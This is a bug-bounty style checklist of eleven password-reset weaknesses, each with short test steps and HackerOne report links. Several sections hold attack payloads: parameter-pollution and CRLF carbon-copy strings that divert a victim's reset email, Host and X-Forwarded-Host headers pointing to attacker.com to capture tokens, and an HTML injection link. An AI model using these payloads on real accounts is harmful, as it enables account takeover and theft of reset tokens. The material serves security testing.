# Password Reset Vulnerability Patterns

## 1. Token Not Expiring After Use
**Test**: Use reset link multiple times after password change

```
1. Request password reset
2. Use link to change password
3. Try using same link again
4. If works → vulnerable
```
Ref: https://hackerone.com/reports/898841

## 2. Token Not Expiring After New Request
**Test**: Old token still valid after requesting new one

```
1. Request reset link (Link A)
2. Request another reset link (Link B)
3. Use Link B to change password
4. Try using Link A
5. If works → vulnerable
```
Ref: https://hackerone.com/reports/283550

## 3. Token Not Expiring After Email Change
**Test**: Token valid even after user changes email

```
1. Request reset link
2. Don't use it
3. Login and change email
4. Try using old reset link
5. If works → vulnerable
```
Ref: https://hackerone.com/reports/685007

## 4. Token Leak via Referer Header
**Test**: Check if token leaks when clicking external links

```
1. Request reset link
2. Click link, go to reset page
3. Click any external link (social media icons)
4. Check Referer header in request
5. If token visible → vulnerable
```
Ref: https://hackerone.com/reports/751581

## 5. Token Leak in Response
**Test**: Check if API returns token in response

```http
POST /access/forgotPassword HTTP/1.1
{"email":"victim@test.com"}

# Check response for:
{"resetPasswordLink":"https://app.com/reset?token=xxx"}
```
Ref: https://medium.com/@yassergersy/account-take-over-via-reset-password-f2e9d887bce1

## 6. Email Parameter Manipulation
**Test**: Try to receive victim's reset token

```bash
# HTTP Parameter Pollution
email=victim@xyz.tld&email=hacker@xyz.tld

# Carbon Copy injection
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld

# Separators
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld

# JSON array
{"email":["victim@xyz.tld","hacker@xyz.tld"]}

# No domain
email=victim

# No TLD
email=victim@xyz
```
Ref: https://hackerone.com/reports/1175081

## 7. Host Header Poisoning
**Test**: Poison reset link with attacker domain

```http
# Method 1: Direct host change
Host: attacker.com

# Method 2: X-Forwarded-Host
Host: target.com
X-Forwarded-Host: attacker.com

# Method 3: Double Host
Host: target.com
Host: attacker.com

# Method 4: Absolute URL
Host: bing.com
X-Forwarded-Host: target.com
```
Use ngrok for attacker server to capture tokens.
Ref: https://hackerone.com/reports/226659

## 8. No Rate Limiting
**Test**: Brute force reset endpoint

```
1. Capture reset request in Burp
2. Send to Intruder
3. Use null payload, 100+ iterations
4. If no blocking → vulnerable
```
Ref: https://hackerone.com/reports/838572

## 9. User Enumeration
**Test**: Different responses for valid/invalid users

```
1. Request reset for existing user → "Reset link sent"
2. Request reset for non-existing → "User not found"
3. If responses differ → enumeration possible
```
Ref: https://hackerone.com/reports/77067

## 10. HTML Injection in Reset Email
**Test**: Inject HTML in name/email fields

```html
<a href="attacker.com"><h1>Please click here to login</h1></a>
```
Ref: https://hackerone.com/reports/111094

## 11. Verification Code in Different Parameter
**Test**: Change email receiving verification code

```http
POST /send-verification
email=attacker@test.com  # Change from victim's email
```

## Quick Checklist
- [ ] Token reuse after password change
- [ ] Token validity after new request
- [ ] Token validity after email change
- [ ] Referer header token leak
- [ ] Token in API response
- [ ] Email parameter manipulation (HPP, CC, separators)
- [ ] Host header poisoning
- [ ] Rate limiting on reset endpoint
- [ ] User enumeration via error messages
- [ ] HTML injection in email template

## References
- https://infosecwriteups.com/all-about-password-reset-vulnerabilities-3bba86ffedc7
- https://book.hacktricks.xyz/pentesting-web/reset-password
